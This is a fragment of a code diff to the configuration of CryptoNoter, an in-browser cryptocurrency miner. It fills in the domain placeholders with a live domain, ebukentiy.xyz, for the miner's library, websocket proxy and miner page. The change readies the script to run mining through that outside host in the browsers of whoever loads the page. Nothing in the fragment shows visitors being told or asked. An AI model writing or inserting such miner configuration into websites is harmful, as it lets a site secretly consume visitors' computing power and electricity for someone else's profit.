@@ -489,8 +489,8 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://%CryptoNoter_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]],
-    CAPTCHA_URL: "https://%CryptoNoter_domain%/captcha/",
-    MINER_URL: "https://%CryptoNoter_domain%/media/miner.html"
+    LIB_URL: "https://ebukentiy.xyz/lib/",
+    WEBSOCKET_SHARDS: [["wss://ebukentiy.xyz/proxy"]],
+    CAPTCHA_URL: "https://ebukentiy.xyz/captcha/",
+    MINER_URL: "https://ebukentiy.xyz/media/miner.html"
 };
